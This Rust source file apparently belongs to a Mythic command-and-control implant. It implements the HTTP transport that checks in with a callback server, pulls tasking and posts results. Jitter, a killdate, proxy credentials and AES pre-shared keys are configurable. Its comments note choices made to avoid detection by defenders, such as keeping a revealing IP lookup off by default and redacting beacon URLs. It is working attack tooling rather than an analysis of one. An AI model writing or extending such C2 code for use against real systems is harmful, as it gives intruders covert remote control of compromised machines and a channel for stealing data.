use crate::DEBUG;
use crate::Result;
use crate::sys::network::http_request;
use core::sync::atomic::Ordering;
use rand::Rng;
use serde::{Deserialize, Serialize};
use std::collections::HashMap;

use super::C2Transport;

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct HttpProfile {
    /// Base64-encoded 32-byte AES key, or `None` to fall back to the
    /// profile-default Mythic generates at build time.
    pub aes_psk: Option<String>,
    pub callback_host: String,
    pub callback_interval: u64,
    pub callback_jitter: u64,
    pub callback_port: u16,
    pub encrypted_exchange_check: bool,
    pub get_uri: String,
    pub headers: HashMap<String, String>,
    pub killdate: String,
    pub post_uri: String,
    pub proxy_host: String,
    pub proxy_pass: String,
    pub proxy_port: String,
    pub proxy_user: String,
    pub query_path_name: String,
    /// When true, query icanhazip.com (over HTTPS) at check-in to populate
    /// the callback's external_ip field. Off by default — the egress is a
    /// strong blue-team indicator.
    #[serde(default)]
    pub external_ip_check: bool,
}

/// Percent-encode bytes that aren't URL-safe.
fn url_encode(s: &str) -> String {
    s.bytes()
        .map(|b| match b {
            b'A'..=b'Z' | b'a'..=b'z' | b'0'..=b'9' | b'-' | b'_' | b'.' | b'~' => {
                format!("{}", b as char)
            }
            _ => format!("%{:02X}", b),
        })
        .collect()
}

/// Truncate the query string of a URL for debug logs. The query string
/// contains the AES-encrypted payload, which is deterministic per (PSK, IV)
/// pair — printing it in full would let observers correlate beacons without
/// holding the PSK.
///
/// In release builds this function is not compiled. The only callers pass it
/// as an argument to the debug-only `info!` macro, so release builds never need
/// the helper.
#[cfg(debug_assertions)]
fn redact_url(url: &str) -> String {
    if let Some(q) = url.find('?') {
        let path = &url[..q];
        let qs = &url[q + 1..];
        if qs.len() <= 64 {
            return format!("{path}?<{}_bytes_redacted>", qs.len());
        }
        return format!("{path}?{}…<{} bytes redacted>", &qs[..48], qs.len());
    }
    url.to_string()
}

impl HttpProfile {
    pub fn external_ip_check(&self) -> bool {
        self.external_ip_check
    }

    fn build_get_url(&self, packed: &str) -> String {
        format!(
            "{}:{}/{}?{}={}",
            self.callback_host,
            self.callback_port,
            self.get_uri,
            self.query_path_name,
            url_encode(packed)
        )
    }

    fn proxy_url(&self) -> Option<String> {
        if self.proxy_host.is_empty() {
            return None;
        }
        let mut url = String::from("http://");
        if !self.proxy_user.is_empty() {
            url.push_str(&url_encode(&self.proxy_user));
            if !self.proxy_pass.is_empty() {
                url.push(':');
                url.push_str(&url_encode(&self.proxy_pass));
            }
            url.push('@');
        }
        url.push_str(&self.proxy_host);
        if !self.proxy_port.is_empty() {
            url.push(':');
            url.push_str(&self.proxy_port);
        }
        Some(url)
    }
}

impl C2Transport for HttpProfile {
    fn get_aes_psk(&self) -> Option<String> {
        self.aes_psk
            .as_deref()
            .map(str::trim)
            .filter(|key| !key.is_empty())
            .map(str::to_string)
    }

    fn set_aes_psk(&mut self, _key: &str) -> Option<String> {
        let old_aes_psk = self.aes_psk.clone();
        self.aes_psk = Some(_key.to_string());
        old_aes_psk
    }

    fn random_iv(&self) -> Result<[u8; 16]> {
        let mut iv = [0u8; 16];
        rand::thread_rng().fill(&mut iv);
        Ok(iv)
    }

    // TODO(2026-07): implement Noise_KK EKE handshake (scripts/init.rs has the test code)
    fn encrypted_exchange_check(&self) -> bool {
        self.encrypted_exchange_check
    }

    fn checkin(&self, packed: &str) -> Result<String> {
        let url = self.build_get_url(packed);
        if DEBUG.load(Ordering::Relaxed) {
            info!("[C2] checkin GET {}", redact_url(&url));
        }
        let resp = http_request(
            &url,
            "GET",
            Some(&self.headers),
            self.proxy_url().as_deref(),
            None,
        )
        .map_err(|e| {
            if DEBUG.load(Ordering::Relaxed) {
                eprintln!("[C2] checkin error: {e}");
            }
            e
        })?;
        if DEBUG.load(Ordering::Relaxed) {
            info!("[C2] checkin resp: {resp}");
        }
        Ok(resp)
    }

    fn get_tasking(&self, packed: &str) -> Result<String> {
        let url = self.build_get_url(packed);
        if DEBUG.load(Ordering::Relaxed) {
            info!("[C2] get_tasking GET {}", redact_url(&url));
        }
        http_request(
            &url,
            "GET",
            Some(&self.headers),
            self.proxy_url().as_deref(),
            None,
        )
    }

    fn post_response(&self, packed: &str) -> Result<String> {
        let url = format!(
            "{}:{}/{}",
            self.callback_host, self.callback_port, self.post_uri
        );
        if DEBUG.load(Ordering::Relaxed) {
            info!("[C2] post_response POST {}", redact_url(&url));
        }
        http_request(
            &url,
            "POST",
            Some(&self.headers),
            self.proxy_url().as_deref(),
            Some(packed),
        )
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn profile() -> HttpProfile {
        HttpProfile {
            aes_psk: None,
            callback_host: "http://127.0.0.1".into(),
            callback_interval: 10,
            callback_jitter: 0,
            callback_port: 80,
            encrypted_exchange_check: false,
            get_uri: "index".into(),
            headers: Default::default(),
            killdate: "".into(),
            post_uri: "data".into(),
            proxy_host: "".into(),
            proxy_pass: "".into(),
            proxy_port: "".into(),
            proxy_user: "".into(),
            query_path_name: "q".into(),
            external_ip_check: false,
        }
    }

    #[test]
    fn proxy_url_encodes_credentials() {
        let mut profile = profile();
        profile.proxy_host = "proxy.local".into();
        profile.proxy_port = "8080".into();
        profile.proxy_user = "user@example.com".into();
        profile.proxy_pass = "p@ss:word".into();

        assert_eq!(
            profile.proxy_url().as_deref(),
            Some("http://user%40example.com:p%40ss%3Aword@proxy.local:8080")
        );
    }

    #[test]
    fn empty_proxy_host_disables_proxy() {
        let mut profile = profile();
        profile.proxy_user = "user".into();
        profile.proxy_pass = "pass".into();

        assert_eq!(profile.proxy_url(), None);
    }
}
